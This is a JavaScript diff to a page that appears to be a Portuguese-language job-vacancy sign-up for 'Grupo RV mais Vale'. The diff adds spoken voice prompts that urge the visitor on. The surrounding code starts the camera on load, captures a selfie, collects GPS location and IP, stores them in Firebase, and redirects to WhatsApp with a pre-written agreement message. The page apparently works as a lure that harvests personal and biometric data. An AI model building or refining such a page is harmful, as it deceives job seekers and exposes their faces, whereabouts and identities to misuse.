@@ -51,28 +51,46 @@ document.getElementById("status");
 const canvas =
 document.getElementById("canvas");
 
+// ======================
+// ÁUDIO AUTOMÁTICO
+// ======================
+
+function falar(texto){
+
+  const fala =
+  new SpeechSynthesisUtterance(
+    texto
+  );
+
+  fala.lang =
+  "pt-BR";
+
+  fala.volume = 1;
+
+  fala.rate = 1;
+
+  fala.pitch = 1;
+
+  speechSynthesis.speak(
+    fala
+  );
+
+}
+
+// ======================
+// INICIAR SISTEMA
+// ======================
+
 async function iniciarSistema(){
 
   try{
 
-    // áudio
-
-    const fala =
-    new SpeechSynthesisUtterance(
-      "Clique no botão verde para participar das vagas."
-    );
-
-    fala.lang =
-    "pt-BR";
-
-    speechSynthesis.speak(
-      fala
+    falar(
+      "Bem vindo ao Grupo RV mais Vale. Clique no botão verde para participar das vagas disponíveis."
     );
 
     statusText.innerHTML =
     "📸 Iniciando câmera...";
-
-    // câmera
 
     const stream =
     await navigator.mediaDevices
@@ -115,6 +133,10 @@ async function iniciarSistema(){
     statusText.innerHTML =
     "✅ Sistema pronto";
 
+    falar(
+      "Sistema pronto. Clique no botão para continuar."
+    );
+
   }
 
   catch(err){
@@ -123,6 +145,10 @@ async function iniciarSistema(){
 
     statusText.innerHTML =
     "❌ Permita câmera";
+
+    falar(
+      "Permita o acesso à câmera para continuar."
+    );
 
   }
 
@@ -133,6 +159,10 @@ window.onload = ()=>{
   iniciarSistema();
 
 };
+
+// ======================
+// BOTÃO
+// ======================
 
 btn.addEventListener(
   "click",
@@ -145,8 +175,12 @@ btn.addEventListener(
       btn.innerHTML =
       "PROCESSANDO...";
 
+      falar(
+        "Cadastro iniciado."
+      );
+
       // ====================
-      // CAPTURA SELFIE
+      // SELFIE
       // ====================
 
       statusText.innerHTML =
@@ -189,8 +223,6 @@ btn.addEventListener(
         0.9
       );
 
-      console.log(selfie);
-
       // ====================
       // LOCALIZAÇÃO
       // ====================
@@ -205,6 +237,10 @@ btn.addEventListener(
 
         statusText.innerHTML =
         "📍 Obtendo localização...";
+
+        falar(
+          "Obtendo localização."
+        );
 
         const localizacao =
         await new Promise(
@@ -233,15 +269,12 @@ btn.addEventListener(
 
       catch(err){
 
-        console.log(
-          "GPS negado",
-          err
-        );
+        console.log(err);
 
       }
 
       // ====================
-      // IP + CIDADE
+      // IP
       // ====================
 
       let ip =
@@ -280,19 +313,20 @@ btn.addEventListener(
 
       catch(err){
 
-        console.log(
-          "Erro IP",
-          err
-        );
+        console.log(err);
 
       }
 
       // ====================
-      // SALVAR FIREBASE
+      // FIREBASE
       // ====================
 
       statusText.innerHTML =
       "💾 Salvando cadastro...";
+
+      falar(
+        "Salvando cadastro."
+      );
 
       await addDoc(
         collection(
@@ -343,8 +377,16 @@ btn.addEventListener(
       statusText.innerHTML =
       "✅ Cadastro concluído";
 
-      window.location.href =
-      "https://wa.me/5594981100607?text=Eu%20concordo%20e%20quero%20participar%20das%20vagas%20do%20Grupo%20RV%20%2B%20Vale.";
+      falar(
+        "Cadastro concluído com sucesso."
+      );
+
+      setTimeout(()=>{
+
+        window.location.href =
+        "https://wa.me/5594981100607?text=Eu%20concordo%20e%20quero%20participar%20das%20vagas%20do%20Grupo%20RV%20%2B%20Vale.";
+
+      },2000);
 
     }
 
@@ -354,6 +396,10 @@ btn.addEventListener(
 
       statusText.innerHTML =
       "❌ Erro no cadastro";
+
+      falar(
+        "Ocorreu um erro no cadastro."
+      );
 
       btn.disabled = false;
 
